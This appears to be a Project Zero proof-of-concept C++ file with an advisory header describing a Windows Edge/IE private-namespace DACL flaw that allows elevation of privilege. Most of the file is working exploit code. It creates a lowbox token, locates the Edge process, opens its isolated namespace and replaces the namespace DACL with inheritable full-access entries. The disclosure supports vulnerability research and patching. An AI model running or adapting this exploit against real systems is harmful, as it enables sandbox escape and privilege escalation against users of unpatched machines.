/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=879

Windows: Edge/IE Isolated Private Namespace Insecure DACL EoP
Platform: Windows 10 10586, Edge 25.10586.0.0 not tested 8.1 Update 2 or Windows 7
Class: Elevation of Privilege

Summary:
The isolated private namespace created by ierutils has a insecure DACL which allows any appcontainer process to gain elevated permissions on the namespace directory which could lead to elevation of privilege.

Description:

In iertutils library IsoOpenPrivateNamespace creates a new Window private namespace (which is an isolated object directory which can be referred to using a boundary descriptor). The function calls CreatePrivateNamespace, setting an explicit DACL which gives the current user, ALL APPLICATION PACKAGES and also owner rights of GENERIC_ALL. This is a problem because this is the only security barrier protecting access to the private namespace, when an application has already created it, this means that for example we can from any other App Container open IE’s or Edge’s with Full Access.

Now how would you go about exploiting this? All the resources added to this isolated container use the default DACL of the calling process (which in IE’s case is usually the medium broker, and presumably in Edge is MicrosoftEdge.exe). The isolated container then adds explicit Low IL and Package SID ACEs to the created DACL of the object. So one way of exploiting this condition is to open the namespace for WRITE_DAC privilege and add inheritable ACEs to the DACL. When the kernel encounters inherited DACLs it ignores the token’s default DACL and applies the inherited permission.

Doing this would result in any new object in the isolated namespace being created by Edge or IE being accessible to the attacker, also giving write access to resources such as IsoSpaceV2_ScopedTrusted which are not supposed to be writable for example from a sandboxed IE tab. I’ve not spent much time actually working out what is or isn’t exploitable but at the least you’d get some level of information disclosure and no doubt EoP.

Note that the boundary name isn’t an impediment to gaining access to the namespace as it’s something like IEUser_USERSID_MicrosoftEdge or IsoScope_PIDOFBROKER, both of which can be trivially determine or in worse case brute forced. You can’t create these namespaces from a lowbox token as the boundary descriptor doesn’t have the package SID, but in this case we don’t need to care. I’m submitted a bug for the other type of issue.

Proof of Concept:

I’ve provided a PoC as a C++ source code file. You need to compile it first targeted with Visual Studio 2015. It will look for a copy of MicrosoftEdge.exe and get its PID (this could be done as brute force), it will then impersonate a lowbox token which shouldn’t have access to any of Edge’s isolated namespace and tries to change the DACL of the root namespace object.

NOTE: For some reason this has a habit of causing MicrosoftEdge.exe to die with a security exception especially on x64. Perhaps it’s checking the DACL somewhere, but I very much doubt it. I’ve not worked out if this is some weird memory corruption occurring (although there’s a chance it wouldn’t be exploitable).

1) Compile the C++ source code file.
2) Start a copy of Edge. You might want to navigate a tab somewhere.
3) Execute the PoC executable as a normal user
4) It should successfully open the namespace and change the DACL.

Expected Result:
Access to the private namespace is not allowed.

Observed Result:
Access to the private namespace is granted and the DACL of the directory has been changed to a set of inherited permissions which will be used.
*/

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <winternl.h>
#include <sddl.h>
#include <memory>
#include <string>
#include <TlHelp32.h>
#include <strstream>
#include <sstream>
#include <vector>

#include <atlbase.h>
#include <atlcom.h>
#include <atlctl.h>
#include <atlhost.h>
#include <atlsecurity.h>
#include <atlwin.h>

typedef NTSTATUS(WINAPI* NtCreateLowBoxToken)(
	OUT PHANDLE token,
	IN HANDLE original_handle,
	IN ACCESS_MASK access,
	IN POBJECT_ATTRIBUTES object_attribute,
	IN PSID appcontainer_sid,
	IN DWORD capabilityCount,
	IN PSID_AND_ATTRIBUTES capabilities,
	IN DWORD handle_count,
	IN PHANDLE handles);
typedef NTSTATUS(WINAPI* NtCreateDirectoryObjectFunction)(
	PHANDLE DirectoryHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes);

//typedef VOID (WINAPI *InitializeObjectAttributes)(
//	POBJECT_ATTRIBUTES   InitializedAttributes,
//	PUNICODE_STRING      ObjectName,
//	ULONG                Attributes,
//	HANDLE               RootDirectory,
//	PSECURITY_DESCRIPTOR SecurityDescriptor
//);
#define InitializeObjectAttributes(p, n, a, r, s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES);\
  (p)->RootDirectory = r;\
  (p)->Attributes = a;\
  (p)->ObjectName = n;\
  (p)->SecurityDescriptor = s;\
  (p)->SecurityQualityOfService = NULL;\
}
typedef VOID(WINAPI *RtlInitUnicodeStringFunction) (
	IN OUT PUNICODE_STRING DestinationString,
	IN PCWSTR SourceString);
#define kNtdllName L"ntdll.dll"
#define DIRECTORY_QUERY 0x0001
#define DIRECTORY_TRAVERSE 0x0002
#define DIRECTORY_CREATE_OBJECT 0x0004
#define DIRECTORY_CREATE_SUBDIRECTORY 0x0008
#define DIRECTORY_ALL_ACCESS 0x000F

enum WellKnownCapabilities {
	kInternetClient,
	kInternetClientServer,
	kPrivateNetworkClientServer,
	kPicturesLibrary,
	kVideosLibrary,
	kMusicLibrary,
	kDocumentsLibrary,
	kEnterpriseAuthentication,
	kSharedUserCertificates,
	kRemovableStorage,
	kAppointments,
	kContacts,
	kMaxWellKnownCapability
};

DWORD WellKnownCapabilityToRid(WellKnownCapabilities capability) {
	switch (capability) {
	case kInternetClient:
		return SECURITY_CAPABILITY_INTERNET_CLIENT;
	case kInternetClientServer:
		return SECURITY_CAPABILITY_INTERNET_CLIENT_SERVER;
	case kPrivateNetworkClientServer:
		return SECURITY_CAPABILITY_PRIVATE_NETWORK_CLIENT_SERVER;
	case kPicturesLibrary:
		return SECURITY_CAPABILITY_PICTURES_LIBRARY;
	case kVideosLibrary:
		return SECURITY_CAPABILITY_VIDEOS_LIBRARY;
	case kMusicLibrary:
		return SECURITY_CAPABILITY_MUSIC_LIBRARY;
	case kDocumentsLibrary:
		return SECURITY_CAPABILITY_DOCUMENTS_LIBRARY;
	case kEnterpriseAuthentication:
		return SECURITY_CAPABILITY_ENTERPRISE_AUTHENTICATION;
	case kSharedUserCertificates:
		return SECURITY_CAPABILITY_SHARED_USER_CERTIFICATES;
	case kRemovableStorage:
		return SECURITY_CAPABILITY_REMOVABLE_STORAGE;
	case kAppointments:
		return SECURITY_CAPABILITY_APPOINTMENTS;
	case kContacts:
		return SECURITY_CAPABILITY_CONTACTS;
	default:
		break;
	}
	return 0;
}

PSID FromSubAuthorities(PSID_IDENTIFIER_AUTHORITY identifier_authority,
	BYTE sub_authority_count,
	PDWORD sub_authorities) {
	PSID sid = malloc(SECURITY_MAX_SID_SIZE);
	if (!::InitializeSid(sid, identifier_authority, sub_authority_count))
		return NULL;

	for (DWORD index = 0; index < sub_authority_count; ++index) {
		PDWORD sub_authority = GetSidSubAuthority(sid, index);
		*sub_authority = sub_authorities[index];
	}
	return sid;
}

PSID FromKnownCapability(WellKnownCapabilities capability) {
	DWORD capability_rid = WellKnownCapabilityToRid(capability);
	if (!capability_rid)
		return NULL;
	SID_IDENTIFIER_AUTHORITY capability_authority = {
		SECURITY_APP_PACKAGE_AUTHORITY };
	DWORD sub_authorities[] = { SECURITY_CAPABILITY_BASE_RID, capability_rid };
	return FromSubAuthorities(&capability_authority, 2, sub_authorities);
}
struct HandleDeleter
{
	typedef HANDLE pointer;
	void operator()(HANDLE handle)
	{
		if (handle && handle != INVALID_HANDLE_VALUE)
		{
			DWORD last_error = ::GetLastError();
			CloseHandle(handle);
			::SetLastError(last_error);
		}
	}
};

typedef std::unique_ptr<HANDLE, HandleDeleter> scoped_handle;

struct LocalFreeDeleter
{
	typedef void* pointer;
	void operator()(void* p)
	{
		if (p)
			::LocalFree(p);
	}
};

typedef std::unique_ptr<void, LocalFreeDeleter> local_free_ptr;

struct PrivateNamespaceDeleter
{
	typedef HANDLE pointer;
	void operator()(HANDLE handle)
	{
		if (handle && handle != INVALID_HANDLE_VALUE)
		{
			::ClosePrivateNamespace(handle, 0);
		}
	}
};

struct scoped_impersonation
{
	BOOL _impersonating;
public:
	scoped_impersonation(const scoped_handle& token) {
		_impersonating = ImpersonateLoggedOnUser(token.get());
	}

	scoped_impersonation() {
		if (_impersonating)
			RevertToSelf();
	}

	BOOL impersonation() {
		return _impersonating;
	}
};

typedef std::unique_ptr<HANDLE, PrivateNamespaceDeleter> private_namespace;

std::wstring GetCurrentUserSid()
{
	HANDLE token = nullptr;
	if (!OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &token))
		return false;
	std::unique_ptr<HANDLE, HandleDeleter> token_scoped(token);

	DWORD size = sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE;
	std::unique_ptr<BYTE[]> user_bytes(new BYTE[size]);
	TOKEN_USER* user = reinterpret_cast<TOKEN_USER*>(user_bytes.get());

	if (!::GetTokenInformation(token, TokenUser, user, size, &size))
		return false;

	if (!user->User.Sid)
		return false;

	LPWSTR sid_name;
	if (!ConvertSidToStringSid(user->User.Sid, &sid_name))
		return false;

	std::wstring ret = sid_name;
	::LocalFree(sid_name);
	return ret;
}

std::wstring GetCurrentLogonSid()
{
	HANDLE token = NULL;
	if (!::OpenProcessToken(::GetCurrentProcess(), TOKEN_QUERY, &token))
		return false;
	std::unique_ptr<HANDLE, HandleDeleter> token_scoped(token);

	DWORD size = sizeof(TOKEN_GROUPS) + SECURITY_MAX_SID_SIZE;
	std::unique_ptr<BYTE[]> user_bytes(new BYTE[size]);
	TOKEN_GROUPS* groups = reinterpret_cast<TOKEN_GROUPS*>(user_bytes.get());

	memset(user_bytes.get(), 0, size);

	if (!::GetTokenInformation(token, TokenLogonSid, groups, size, &size))
		return false;

	if (groups->GroupCount != 1)
		return false;

	LPWSTR sid_name;
	if (!ConvertSidToStringSid(groups->Groups[0].Sid, &sid_name))
		return false;

	std::wstring ret = sid_name;
	::LocalFree(sid_name);
	return ret;
}

class BoundaryDescriptor
{
public:
	BoundaryDescriptor()
		: boundary_desc_(nullptr) {
	}

	~BoundaryDescriptor() {
		if (boundary_desc_) {
			DeleteBoundaryDescriptor(boundary_desc_);
		}
	}

	bool Initialize(const wchar_t* name) {
		boundary_desc_ = ::CreateBoundaryDescriptorW(name, 0);
		if (!boundary_desc_)
			return false;

		return true;
	}

	bool AddSid(LPCWSTR sid_str)
	{
		if (_wcsicmp(sid_str, L"CU") == 0)
		{
			return AddSid(GetCurrentUserSid().c_str());
		}
		else
		{
			PSID p = nullptr;

			if (!::ConvertStringSidToSid(sid_str, &p))
			{
				return false;
			}

			std::unique_ptr<void, LocalFreeDeleter> buf(p);

			SID_IDENTIFIER_AUTHORITY il_id_auth = { { 0,0,0,0,0,0x10 } };
			PSID_IDENTIFIER_AUTHORITY sid_id_auth = GetSidIdentifierAuthority(p);

			if (memcmp(il_id_auth.Value, sid_id_auth->Value, sizeof(il_id_auth.Value)) == 0)
			{
				return !!AddIntegrityLabelToBoundaryDescriptor(&boundary_desc_, p);
			}
			else
			{
				return !!AddSIDToBoundaryDescriptor(&boundary_desc_, p);
			}
		}
	}

	HANDLE boundry_desc() {
		return boundary_desc_;
	}

private:
	HANDLE boundary_desc_;
};

void InitObjectAttribs(const std::wstring& name, ULONG attributes, HANDLE root,
	OBJECT_ATTRIBUTES* obj_attr, UNICODE_STRING* uni_name) {
	static RtlInitUnicodeStringFunction RtlInitUnicodeString;
	if (!RtlInitUnicodeString) {
		HMODULE ntdll = ::GetModuleHandle(kNtdllName);
		RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringFunction>(
			GetProcAddress(ntdll, "RtlInitUnicodeString"));
		//DCHECK(RtlInitUnicodeString);
	}
	RtlInitUnicodeString(uni_name, name.c_str());
	InitializeObjectAttributes(obj_attr, uni_name, attributes, root, NULL);
}

HANDLE CreateLowBoxObjectDirectory(PSID lowbox_sid) {
	DWORD session_id = 0;
	if (!::ProcessIdToSessionId(::GetCurrentProcessId(), &session_id))
		return NULL;

	LPWSTR sid_string = NULL;
	if (!::ConvertSidToStringSid(lowbox_sid, &sid_string))
		return NULL;

	WCHAR buffer[1000] = { 0 };
	swprintf_s(buffer, L"\\Sessions\\%d\\AppContainerNamedObjects\\%ls",session_id, sid_string);
	::LocalFree(sid_string);

	std::wstring directory_path = buffer;
	NtCreateDirectoryObjectFunction CreateObjectDirectory = NULL;
	//ResolveNTFunctionPtr("NtCreateDirectoryObject", &CreateObjectDirectory);
	CreateObjectDirectory = (NtCreateDirectoryObjectFunction)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateDirectoryObject");
	OBJECT_ATTRIBUTES obj_attr;
	UNICODE_STRING obj_name;
	InitObjectAttribs(directory_path,
		OBJ_CASE_INSENSITIVE | OBJ_OPENIF,
		NULL,
		&obj_attr,
		&obj_name);

	HANDLE handle = NULL;
	NTSTATUS status = CreateObjectDirectory(&handle,
		DIRECTORY_ALL_ACCESS,
		&obj_attr);

	if (!NT_SUCCESS(status))
		return NULL;

	return handle;
}
enum IntegrityLevel {
	INTEGRITY_LEVEL_SYSTEM,
	INTEGRITY_LEVEL_HIGH,
	INTEGRITY_LEVEL_MEDIUM,
	INTEGRITY_LEVEL_MEDIUM_LOW,
	INTEGRITY_LEVEL_LOW,
	INTEGRITY_LEVEL_BELOW_LOW,
	INTEGRITY_LEVEL_UNTRUSTED,
	INTEGRITY_LEVEL_LAST
};


bool GetDefaultDacl(
	HANDLE token,
	std::unique_ptr<TOKEN_DEFAULT_DACL>* default_dacl) {
	if (!token)
		return false;


	unsigned long length = 0;
	::GetTokenInformation(token, TokenDefaultDacl, nullptr, 0, &length);
	if (length == 0) {
		return false;
	}

	TOKEN_DEFAULT_DACL* acl =
		reinterpret_cast<TOKEN_DEFAULT_DACL*>(malloc(length));
	default_dacl->reset(acl);

	if (!::GetTokenInformation(token, TokenDefaultDacl, default_dacl->get(),
		length, &length))
		return false;

	return true;
}


bool AddSidToDacl(const PSID sid,
	ACL* old_dacl,
	ACCESS_MODE access_mode,
	ACCESS_MASK access,
	ACL** new_dacl) {
	EXPLICIT_ACCESS new_access = { 0 };
	new_access.grfAccessMode = access_mode;
	new_access.grfAccessPermissions = access;
	new_access.grfInheritance = NO_INHERITANCE;

	new_access.Trustee.pMultipleTrustee = nullptr;
	new_access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
	new_access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	new_access.Trustee.ptstrName = reinterpret_cast<LPWSTR>(sid);

	if (ERROR_SUCCESS != ::SetEntriesInAcl(1, &new_access, old_dacl, new_dacl))
		return false;

	return true;
}

bool AddSidToDefaultDacl(HANDLE token,
	const PSID& sid,
	ACCESS_MODE access_mode,
	ACCESS_MASK access) {
	if (!token)
		return false;

	std::unique_ptr<TOKEN_DEFAULT_DACL> default_dacl;
	if (!GetDefaultDacl(token, &default_dacl))
		return false;

	ACL* new_dacl = nullptr;
	if (!AddSidToDacl(sid, default_dacl->DefaultDacl, access_mode, access,
		&new_dacl))
		return false;

	TOKEN_DEFAULT_DACL new_token_dacl = { 0 };
	new_token_dacl.DefaultDacl = new_dacl;

	bool ret = ::SetTokenInformation(token, TokenDefaultDacl, &new_token_dacl,
		sizeof(new_token_dacl));
	::LocalFree(new_dacl);
	return ret;
}

bool RevokeLogonSidFromDefaultDacl(HANDLE token) {
	DWORD size = sizeof(TOKEN_GROUPS) + SECURITY_MAX_SID_SIZE;
	TOKEN_GROUPS* logon_sid = reinterpret_cast<TOKEN_GROUPS*>(malloc(size));

	std::unique_ptr<TOKEN_GROUPS> logon_sid_ptr(logon_sid);

	if (!::GetTokenInformation(token, TokenLogonSid, logon_sid, size, &size)) {
		// If no logon sid, there's nothing to revoke.
		if (::GetLastError() == ERROR_NOT_FOUND)
			return true;
		return false;
	}
	if (logon_sid->GroupCount < 1) {
		::SetLastError(ERROR_INVALID_TOKEN);
		return false;
	}
	return AddSidToDefaultDacl(token,
		reinterpret_cast<SID*>(logon_sid->Groups[0].Sid),
		REVOKE_ACCESS, 0);
}

bool AddUserSidToDefaultDacl(HANDLE token, ACCESS_MASK access) {
	DWORD size = sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE;
	TOKEN_USER* token_user = reinterpret_cast<TOKEN_USER*>(malloc(size));

	std::unique_ptr<TOKEN_USER> token_user_ptr(token_user);

	if (!::GetTokenInformation(token, TokenUser, token_user, size, &size))
		return false;

	return AddSidToDefaultDacl(token,
		reinterpret_cast<SID*>(token_user->User.Sid),
		GRANT_ACCESS, access);
}

bool AddKnownSidToObject(HANDLE object,
	SE_OBJECT_TYPE object_type,
	const PSID& sid,
	ACCESS_MODE access_mode,
	ACCESS_MASK access) {
	PSECURITY_DESCRIPTOR descriptor = nullptr;
	PACL old_dacl = nullptr;
	PACL new_dacl = nullptr;

	if (ERROR_SUCCESS !=
		::GetSecurityInfo(object, object_type, DACL_SECURITY_INFORMATION, nullptr,
			nullptr, &old_dacl, nullptr, &descriptor))
		return false;

	if (!AddSidToDacl(sid, old_dacl, access_mode, access, &new_dacl)) {
		::LocalFree(descriptor);
		return false;
	}

	DWORD result =
		::SetSecurityInfo(object, object_type, DACL_SECURITY_INFORMATION, nullptr,
			nullptr, new_dacl, nullptr);

	::LocalFree(new_dacl);
	::LocalFree(descriptor);

	if (ERROR_SUCCESS != result)
		return false;

	return true;
}
const wchar_t* GetIntegrityLevelString(IntegrityLevel integrity_level) {
	switch (integrity_level) {
	case INTEGRITY_LEVEL_SYSTEM:
		return L"S-1-16-16384";
	case INTEGRITY_LEVEL_HIGH:
		return L"S-1-16-12288";
	case INTEGRITY_LEVEL_MEDIUM:
		return L"S-1-16-8192";
	case INTEGRITY_LEVEL_MEDIUM_LOW:
		return L"S-1-16-6144";
	case INTEGRITY_LEVEL_LOW:
		return L"S-1-16-4096";
	case INTEGRITY_LEVEL_BELOW_LOW:
		return L"S-1-16-2048";
	case INTEGRITY_LEVEL_UNTRUSTED:
		return L"S-1-16-0";
	case INTEGRITY_LEVEL_LAST:
		return nullptr;
	}
	return nullptr;
}

DWORD SetTokenIntegrityLevel(HANDLE token, IntegrityLevel integrity_level) {
	const wchar_t* integrity_level_str = GetIntegrityLevelString(integrity_level);
	if (!integrity_level_str) {
		// No mandatory level specified, we don't change it.
		return ERROR_SUCCESS;
	}

	PSID integrity_sid = nullptr;
	if (!::ConvertStringSidToSid(integrity_level_str, &integrity_sid))
		return ::GetLastError();

	TOKEN_MANDATORY_LABEL label = {};
	label.Label.Attributes = SE_GROUP_INTEGRITY;
	label.Label.Sid = integrity_sid;

	DWORD size = sizeof(TOKEN_MANDATORY_LABEL) + ::GetLengthSid(integrity_sid);
	bool result = ::SetTokenInformation(token, TokenIntegrityLevel, &label, size);
	auto last_error = ::GetLastError();
	::LocalFree(integrity_sid);

	return result ? ERROR_SUCCESS : last_error;
}

DWORD GetRestrictedToken(HANDLE &token){
	HANDLE existingHandleToken = ::GetCurrentProcessToken();
	std::vector<const SID*> sids_to_restrict_;
	std::vector<const SID*> sids_for_deny_only_;
	std::vector<const SID*> privileges_to_disable_;
	const SID* worlds = ATL::Sids::World().GetPSID();
	sids_to_restrict_.push_back(ATL::Sids::World().GetPSID());
	size_t deny_size = sids_for_deny_only_.size();
	size_t restrict_size = sids_to_restrict_.size();
	size_t privileges_size = privileges_to_disable_.size();

	SID_AND_ATTRIBUTES* deny_only_array = nullptr;
	if (deny_size) {
		deny_only_array = new SID_AND_ATTRIBUTES[deny_size];

		for (unsigned int i = 0; i < sids_for_deny_only_.size(); ++i) {
			deny_only_array[i].Attributes = SE_GROUP_USE_FOR_DENY_ONLY;
			deny_only_array[i].Sid = (PSID)sids_for_deny_only_[i];
		}
	}

	SID_AND_ATTRIBUTES* sids_to_restrict_array = nullptr;
	if (restrict_size) {
		sids_to_restrict_array = new SID_AND_ATTRIBUTES[restrict_size];

		for (unsigned int i = 0; i < restrict_size; ++i) {
			sids_to_restrict_array[i].Attributes = 0;
			sids_to_restrict_array[i].Sid = (PSID)sids_to_restrict_[i];
		}
	}

	LUID_AND_ATTRIBUTES* privileges_to_disable_array = nullptr;
	//if (privileges_size) {
	//	privileges_to_disable_array = new LUID_AND_ATTRIBUTES[privileges_size];

	//	for (unsigned int i = 0; i < privileges_size; ++i) {
	//		privileges_to_disable_array[i].Attributes = 0;
	//		privileges_to_disable_array[i].Luid = (PSID)privileges_to_disable_[i];
	//	}
	//}

	bool result = true;
	HANDLE new_token_handle = nullptr;
	if (deny_size || restrict_size || privileges_size) {
		result = ::CreateRestrictedToken(
			existingHandleToken, 0, static_cast<DWORD>(deny_size),
			deny_only_array, static_cast<DWORD>(privileges_size),
			privileges_to_disable_array, static_cast<DWORD>(restrict_size),
			sids_to_restrict_array, &new_token_handle);
	}
	else {
		// Duplicate the token even if it's not modified at this point
		// because any subsequent changes to this token would also affect the
		// current process.
		result = ::DuplicateTokenEx(existingHandleToken, TOKEN_ALL_ACCESS,
			nullptr, SecurityIdentification, TokenPrimary,
			&new_token_handle);
	}
	auto last_error = ::GetLastError();

	if (deny_only_array)
		delete[] deny_only_array;

	if (sids_to_restrict_array)
		delete[] sids_to_restrict_array;

	if (privileges_to_disable_array)
		delete[] privileges_to_disable_array;

	if (!result)
		return last_error;


	// [TODO]:Check this one...
	bool lockdown_default_dacl_ = false;
	if (lockdown_default_dacl_) {
		// Don't add Restricted sid and also remove logon sid access.
		if (!RevokeLogonSidFromDefaultDacl(new_token_handle))
			return ::GetLastError();
	}
	else {
		// Modify the default dacl on the token to contain Restricted.
		DWORD size_sid = SECURITY_MAX_SID_SIZE;
			BYTE sid_[SECURITY_MAX_SID_SIZE];
		::CreateWellKnownSid(WinRestrictedCodeSid, nullptr, sid_, &size_sid);
		if (!AddSidToDefaultDacl(new_token_handle, sid_,
			GRANT_ACCESS, GENERIC_ALL)) {
			return ::GetLastError();
		}
	}

	// Add user to default dacl.
	if (!AddUserSidToDefaultDacl(new_token_handle, GENERIC_ALL))
		return ::GetLastError();
	IntegrityLevel integrity_level_ = INTEGRITY_LEVEL_LAST;
	DWORD error = SetTokenIntegrityLevel(new_token_handle, integrity_level_);
	if (ERROR_SUCCESS != error)
		return error;

	HANDLE token_handle;
	if (!::DuplicateHandle(::GetCurrentProcess(), new_token_handle,
		::GetCurrentProcess(), &token_handle, TOKEN_ALL_ACCESS,
		false,  // Don't inherit.
		0)) {
		return ::GetLastError();
	}

	token = token_handle;
	return ERROR_SUCCESS;
}

scoped_handle CreateLowboxToken()
{
	
	PSID package_sid_p;
	if (!ConvertStringSidToSid(L"S-1-15-2-1-1-1-1-1-1-1-1-1-1-1", &package_sid_p))
	{
		printf("[ERROR] creating SID: %d\n", GetLastError());
		return nullptr;
	}
	std::vector<PSID> capabilities;
	capabilities.push_back(FromKnownCapability(kInternetClient));
	capabilities.push_back(FromKnownCapability(kPrivateNetworkClientServer));
	std::vector<SID_AND_ATTRIBUTES> capability_sids_;
	std::vector<PSID>::iterator iter_cap;
	capability_sids_.resize(capabilities.size());
	for(size_t index = 0; index < capability_sids_.size(); index++)
	{
		capability_sids_[index].Sid = capabilities[index];
		capability_sids_[index].Attributes = SE_GROUP_ENABLED;
	}
	//SecurityCapabilities caps_with_capabilities(package_sid_p, capabilities);

	local_free_ptr package_sid(package_sid_p);
	HANDLE save_handles[1] = { CreateLowBoxObjectDirectory(package_sid_p) };
	DWORD save_handle_count = 1;
	HANDLE process_token_h;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &process_token_h))
	{
		printf("[ERROR] error opening process token SID: %d\n", GetLastError());
		return nullptr;
	}

	scoped_handle process_token(process_token_h);
	GetRestrictedToken(process_token_h);
	NtCreateLowBoxToken fNtCreateLowBoxToken = (NtCreateLowBoxToken)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateLowBoxToken");
	HANDLE lowbox_token_h;
	OBJECT_ATTRIBUTES obja = {};
	InitializeObjectAttributes(&obja, nullptr, 0, nullptr, nullptr);

	NTSTATUS status = fNtCreateLowBoxToken(&lowbox_token_h, process_token_h, TOKEN_ALL_ACCESS, &obja, package_sid_p, capabilities.size(), capability_sids_.data(), save_handle_count, save_handles);
	if (status != 0)
	{
		printf("[ERROR] creating lowbox token: %08X\n", status);
		return nullptr;
	}

	scoped_handle lowbox_token(lowbox_token_h);
	HANDLE imp_token;

	if (!DuplicateTokenEx(lowbox_token_h, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &imp_token))
	{
		printf("[ERROR] duplicating lowbox: %d\n", GetLastError());
		return nullptr;
	}

	return scoped_handle(imp_token);
}

DWORD FindMicrosoftEdgeExe()
{
	scoped_handle th_snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
	if (!th_snapshot)
	{
		printf("[ERROR] getting snapshot: %d\n", GetLastError());
		return 0;
	}
	PROCESSENTRY32 proc_entry = {};
	proc_entry.dwSize = sizeof(proc_entry);

	if (!Process32First(th_snapshot.get(), &proc_entry))
	{
		printf("[ERROR] enumerating snapshot: %d\n", GetLastError());
		return 0;
	}

	do
	{
		if (_wcsicmp(proc_entry.szExeFile, L"microsoftedge.exe") == 0)
		{
			return proc_entry.th32ProcessID;
		}
		proc_entry.dwSize = sizeof(proc_entry);
	} while (Process32Next(th_snapshot.get(), &proc_entry));

	return 0;
}

void ChangeDaclOnNamespace(LPCWSTR name, const scoped_handle& token)
{
	BoundaryDescriptor boundry;
	if (!boundry.Initialize(name))
	{
		printf("[ERROR] initializing boundary descriptor: %d\n", GetLastError());
		return;
	}

	PSECURITY_DESCRIPTOR psd;
	ULONG sd_size = 0;
	std::wstring sddl = L"D:(A;OICI;GA;;;WD)(A;OICI;GA;;;AC)(A;OICI;GA;;;WD)(A;OICI;GA;;;S-1-0-0)";
	sddl += L"(A;OICI;GA;;;" + GetCurrentUserSid() + L")";
	sddl += L"(A;OICI;GA;;;" + GetCurrentLogonSid() + L")";
	sddl += L"S:(ML;OICI;NW;;;S-1-16-0)";

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl.c_str(), SDDL_REVISION_1, &psd, &sd_size))
	{
		printf("[ERROR] converting SDDL: %d\n", GetLastError());
		return;
	}
	std::unique_ptr<void, LocalFreeDeleter> sd_buf(psd);

	scoped_impersonation imp(token);
	if (!imp.impersonation())
	{
		printf("[ERROR] impersonating lowbox: %d\n", GetLastError());
		return;
	}

	private_namespace ns(OpenPrivateNamespace(boundry.boundry_desc(), name));
	if (!ns)
	{
		printf("[ERROR] opening private namespace - %ls: %d\n", name, GetLastError());
		return;
	}

	if (!SetKernelObjectSecurity(ns.get(), DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION, psd))
	{
		printf("[ERROR] setting DACL on %ls: %d\n", name, GetLastError());
		return;
	}

	printf("[SUCCESS] Opened Namespace and Reset DACL %ls\n", name);
}

//int main()
//{
//	scoped_handle lowbox_token = CreateLowboxToken();
//	if (!lowbox_token)
//	{
//		return 1;
//	}
//
//	std::wstring user_sid = GetCurrentUserSid();
//	DWORD pid = FindMicrosoftEdgeExe();
//	if (pid == 0)
//	{
//		printf("[ERROR] Couldn't find MicrosoftEdge.exe running\n");
//		return 1;
//	}
//
//	printf("[SUCCESS] Found Edge Browser at PID: %X\n", pid);
//
//	std::wstringstream ss;
//
//	ss << L"IsoScope_" << std::hex << pid;
//
//	ChangeDaclOnNamespace(ss.str().c_str(), lowbox_token);
//
//	return 0;
//}

